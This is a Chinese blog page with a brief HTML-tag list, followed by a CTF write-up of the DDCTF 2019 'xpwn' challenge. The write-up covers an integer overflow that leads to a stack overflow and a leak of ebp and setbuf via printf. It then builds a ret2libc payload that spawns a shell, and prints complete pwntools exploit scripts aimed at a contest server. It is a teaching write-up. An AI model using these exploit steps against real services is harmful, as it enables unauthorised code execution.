<p>head 头信息<br>title 标题<br>body 正文<br>font 字体<br>br 换行<br>p 段落<br>pre 预格式化<br>hr 水平分界线<br>sup 上标<br>sub 下标<br>b 粗体<br>i 斜体<br>u 下划线<br>em 强调(斜体)<br>strong 强调(粗体)<br>tt 等宽字体(打印机字体)</p>
<ol>
<li></li>
<li></li>
</ol>有序列表
<ul>
<li></li>
<li></li>
</ul>无序列表
<a href=#>超链接
<img src=#>图片链接
th 表头单元
td 表格单元
tr 表格行
table 表格
caption 表格标题
form 交互式表单
input 输入表单控件
option 菜单类控件可选项 select中使用
select 菜单类控件
textarea 多行文本域
style 样式表

<h1 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h1><p><code>计算机输出</code><br><kbd>键盘输入</kbd><br><tt>打字机文本</tt><br><samp>计算机代码样本</samp><br><var>计算机变量</var></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/04/19/pwn-stack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="One people that no one know">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/19/pwn-stack/" class="post-title-link" itemprop="url">滴滴CTF之唯一的pwn题详解</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-04-19 03:14:36" itemprop="dateCreated datePublished" datetime="2019-04-19T03:14:36+08:00">2019-04-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-30 17:59:59" itemprop="dateModified" datetime="2019-10-30T17:59:59+08:00">2019-10-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index">
                    <span itemprop="name">二进制</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/stack/" itemprop="url" rel="index">
                    <span itemprop="name">stack</span>
                  </a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>5.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>5 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="滴滴CTF之唯一的pwn题详解"><a href="#滴滴CTF之唯一的pwn题详解" class="headerlink" title="滴滴CTF之唯一的pwn题详解"></a>滴滴CTF之唯一的pwn题详解</h1><p>前言：这道题比赛期间没怎么研究，第一次搞了一天没搞出，不知道什么错，然后放弃了，然后比完后，搜了一波exp后，自己具体调试了一波，懂了整个过程，有些师傅们的wp有些小瑕疵，还有就是师傅们从来不详细写简单题的writeup，导致新手很难懂exp。好了，开始正文:</p>
<h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// [esp+44h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = &amp;a1;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  sub_80485DB(<span class="built_in">stdin</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please set the length of password: "</span>);</span><br><span class="line">  nbytes = sub_804862D();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Too long!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter password(lenth %u): "</span>, nbytes);</span><br><span class="line">  v1 = fileno(<span class="built_in">stdin</span>);</span><br><span class="line">  read(v1, &amp;buf, nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"All done, bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>sub_80485DB(stdin, stdout)内部代码</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_80485DB</span><span class="params">(FILE *stream, FILE *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter username: "</span>);</span><br><span class="line">  v2 = fileno(stream);</span><br><span class="line">  read(v2, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fprintf</span>(a2, <span class="string">"Hello %s"</span>, &amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>sub_804862D()内部代码</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804862D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = fileno(<span class="built_in">stdin</span>);</span><br><span class="line">  read(v0, nptr, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">return</span> atoi(nptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从sub_804862D()这里明显可以看出整数溢出的洞，输入-1即可，-1在32位机器上为0xffffffff,具体可以自行调试查看，转化为signed int为-1，小于63，接下来在read(v1, &amp;buf, nbytes);就可以输入很长的一串字符，看上去好像很简单对吧，整数溢出，然后接着栈溢出，ROP一波梭。。。我觉得是这样的，可是运行自己的exp起来后，发觉有很大的问题，每次都是出错<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g27zjxto4tj30m90g5adg.jpg" alt="1"><br>具体调试，你可以从</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./xpwn'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    io = process(<span class="string">'./xpwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">    io = remote(<span class="string">"116.85.48.105"</span>, <span class="number">5005</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IntOverFlow</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendline(str(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">UserName</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendafter(<span class="string">'Enter username: '</span>, payload)</span><br><span class="line">    io.recvuntil(payload)</span><br><span class="line">    __ebp__ = u32(io.recv(<span class="number">4</span>)) </span><br><span class="line">    setbuf = u32(io.recv(<span class="number">4</span>)) - <span class="number">21</span></span><br><span class="line">    log.success(<span class="string">"ebp: "</span> +  hex(__ebp__))</span><br><span class="line">    log.success(<span class="string">"setbuf: "</span> + hex(setbuf))</span><br><span class="line">    <span class="keyword">return</span> __ebp__, setbuf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Passwd</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Enter password'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    addr = UserName(<span class="string">'a'</span>*<span class="number">0x28</span>)</span><br><span class="line">    ebp = addr[<span class="number">0</span>]</span><br><span class="line">    ecx = ebp + <span class="number">24</span></span><br><span class="line">    setbuf = addr[<span class="number">1</span>]</span><br><span class="line">    IntOverFlow(<span class="number">-1</span>)</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    libc_base = setbuf - libc.symbols[<span class="string">'setbuf'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">    <span class="comment">#payload = 'a'*0x44 + p32(ecx) + p32(0)*6 + p32(system_addr) + p32(0) + p32(bin_sh)</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    Passwd(<span class="string">'a'</span>*<span class="number">0x60</span>)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><ul>
<li>在具体地方附加，用gdb.attach(io)附加，然后finish 3次出到最外层，最外层的地址就是0x80开头的这种，然后单步运行，你会发觉最后出错的地方在read这里，然后read函数出错，这里我当时不知道怎么继续调试下去了，一直卡死在这，还有个小问题，我发觉第一次printf会输出一些乱码，按照往常来说，这里肯定泄露了信息，所以具体这里泄露了什么信息，就得你自己去发现了。<br>后面从大佬的wp里发觉，他说ecx不能改，然后我就去看汇编代码了，</li>
</ul>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g285j7w0nhj30iz0evdh0.jpg" alt="2"></p>
<ul>
<li>发觉最后一行有点道道，你看我上一张图的错误，0x6161615d,为什么不是0x61616161呢，ecx-4,联系起来没有，刚好0x61616161-0x6161615d = 4 ,也就是说，我把ecx覆盖成错误的值了，所以就没法正确读入了，那我如何找到ecx的正确位置呢,这时候就运用gdb了<br>我直接将Passwd(‘a’*0x60)这句注释掉，然后python运行这个脚本，然后用<br>gdb-peda$ pattern_create 200<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287zdxr09j30m70f0tb5.jpg" alt="10"><br>创建一串字符，然后复制，然后<br>gdb-peda$ c<br>在打开的另一个终端里输入这串字符<br>然后获得这张图<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287zjk9y0j30md0c6dhf.jpg" alt="11"><br>Program received signal SIGSEGV (fault address 0x4141333d)<br>有这句话<br>然后复制这个address<br>0x4141333d,在将他+4，为什么要加4呢，因为我们刚刚那里ecx-了个4<br>所以变成0x41413341<br>gdb-peda$ pattern_offset 0x41413341<br>获得偏移，1094792001 found at offset: 68</li>
</ul>
<h2 id="定点泄露"><a href="#定点泄露" class="headerlink" title="定点泄露"></a>定点泄露</h2><p>68个偏移，好了，知道错误在哪了，如何泄露ecx？关键点来了，还记得刚开始的printf输出的乱码吗，这里肯定有泄露信息，从ida里我看不出什么东西，所以，gdb也调试一波了</p>
<p>你可以直接gdb filename 或者 gdb 启动后在file加载都行，</p>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g285op2bscj30m70f9n1g.jpg" alt="3"></p>
<p>然后输入start开始，这时候你们的界面可能跟我不太一样，因为我装了插件，peda和pwndbg</p>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g285sjp1qej31bd0qb13z.jpg" alt="4"></p>
<p>单步输入n 走到push ecx这里，因为我需要的是ecx，和ebp,为什么需要ebp呢，因为知道ebp我在知道偏移，整个栈的位置都知道了，所以我需要把这里的数据记录下来，可以看到，寄存器里存的值</p>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287w3uv2jj30qt0l6tdz.jpg" alt="12"></p>
<p>ecx 0xffffd160<br>ebp 0xffffd148<br>然后我需要继续运行软件，到我应该栈溢出的地方，这时候先下个断，<br>gdb$ b read<br>在read函数处下断，然后再<br>gdb$ c</p>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287we3ahoj30m80ekte2.jpg" alt="5"></p>
<p>这时候会在read函数处断下，不担心，输入finish<br>gdb$ finish<br>然后让你输入名字，直接回车，这时候继续单步，单步就是输入n(next)<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287wmw6ocj30vs0ok47n.jpg" alt="13"></p>
<p>在fprintf这里停下，看地址，取出0xffffd090<br>然后<br>gdb$ x/20wx 0xffffd090<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287wt79m9j30kz03vaac.jpg" alt="14"></p>
<p>好了，我看到关键点了，0xffffd148,在第三行第三列里，也就是ebp的值，也就是说，我们需要输入10个4字节就可以到这个地方，还有，你看ebp后面的地址，0xf7e2c935，这里是不是很像libc函数的地址，这里我为什么说像呢，从上面我看寄存器那张图里可以看到__libc_start_main+241的地址，他就是这个类型的。</p>
<p>所以，我输出一下这里的地址看看内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/wx 0xf7e2c935</span><br><span class="line">0xf7e2c935 &lt;setbuf+21&gt;:	0xc31cc483</span><br></pre></td></tr></table></figure>
<p>果真如此，setbuf的地址我们也拿到了，一次性泄露了ebp和setbuf+21的地址，所以这时候怎么获得ecx的值呢，这里你就想每次栈的相对位置会变吗，不会的，所以，开局ebp和ecx的地址相差也不会变，所以我就用ebp和ecx的偏差<br>ecx 0xffffd160<br>ebp 0xffffd148<br>ecx - ebp = 0x18<br>所以ebp+0x18就是ecx了，找到ecx了，也找到setbuf地址了，现在便剩下</p>
<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>payload = ‘a’*0x44 + p32(ecx)+p32(system_addr)+p32(0) + p32(bin_sh)<br>按理说payload这样就行了，先填充位置，在填充ecx，在返回地址就完美了，运行下试试<br>这里我不告诉你们具体怎么做了，因为都是运行我刚刚讲的几条命令，finish,c，n,</p>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287x3g3l0j30ss0mh0zp.jpg" alt="15"></p>
<p>看这里esp指向了我的system,也就是说我还没到返回地址，还有你看最后一步，他还会通过ecx-4改掉esp,所以还没到重点，所以很明显，我还要将两个pop填充掉，也就是得弄两个空的给他<br>payload = ‘a’<em>0x44 + p32(ecx)+ p32(0) * 2 + p32(system_addr)+p32(0) + p32(bin_sh)<br>这样下去可以填充掉那部分，还有个他改了esp的地址，看他修改了多少偏移<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287x8ni0fj30rg0l6jwz.jpg" alt="16"><br>从图中可以看出esp跟ecp差了4个偏移，也就是4</em>4=16大小<br>所以我们可以<br>payload = ‘a’*0x44 + p32(ecx-16)+ p32(0) * 2 + p32(system_addr)+p32(0) + p32(bin_sh)<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287xdxivlj30mr06x75l.jpg" alt="17"><br>yes,成功</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>现在从整体上来分析下过程，先利用printf泄露ebp和setbuf+21地址，然后利用ebp和ecx的固定偏移计算出ecx,然后定点覆盖到ecx具体地址，定位ret的位置，然后进行payload构造，最后成功ROP<br>附上最后的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./xpwn'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    io = process(<span class="string">'./xpwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">    io = remote(<span class="string">"116.85.48.105"</span>, <span class="number">5005</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IntOverFlow</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendline(str(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">UserName</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendafter(<span class="string">'Enter username: '</span>, payload)</span><br><span class="line">    io.recvuntil(payload)</span><br><span class="line">    __ebp__ = u32(io.recv(<span class="number">4</span>)) </span><br><span class="line">    setbuf = u32(io.recv(<span class="number">4</span>)) - <span class="number">21</span></span><br><span class="line">    log.success(<span class="string">"ebp: "</span> +  hex(__ebp__))</span><br><span class="line">    log.success(<span class="string">"setbuf: "</span> + hex(setbuf))</span><br><span class="line">    <span class="keyword">return</span> __ebp__, setbuf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Passwd</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Enter password'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    addr = UserName(<span class="string">'a'</span>*<span class="number">0x28</span>)</span><br><span class="line">    ebp = addr[<span class="number">0</span>]</span><br><span class="line">    ecx = ebp + <span class="number">24</span></span><br><span class="line">    setbuf = addr[<span class="number">1</span>]</span><br><span class="line">    IntOverFlow(<span class="number">-1</span>)</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    libc_base = setbuf - libc.symbols[<span class="string">'setbuf'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x44</span> + p32(ecx<span class="number">-16</span>) + p32(<span class="number">0</span>)*<span class="number">2</span> + p32(system_addr)+p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line">    Passwd(payload)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>



<p><strong>总结：</strong></p>
<ul>
<li>这道题其实不难，难的是大部分要调试，调试部分的话，我写的也7,8成了，具体就靠你们自己慢慢去调试了，关键还是要看清栈的结构，知道他的位置，其余就是基本的ROP了,</li>
<li>虽然题目不难，但我光调试花了好长时间，最主要还是没了解还可以这么玩，学到了师傅们的姿势，谢谢ddctf，谢谢大佬们的writeup</li>
<li>如果还有什么不懂了，可以下方留言</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

  </div>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="site-author-image" itemprop="image" alt="LiHua"
    src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">LiHua</p>
  <div class="site-description" itemprop="description">One people that no one know</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">51</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">28</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">25</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">LiHua</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    <span title="Symbols count total">268k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">4:04</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.0.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.4.2
  </div>

        












        
      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
<script src="/js/schemes/muse.js"></script>
<script src="/js/next-boot.js"></script>



  
















  

  

</body>
</html>
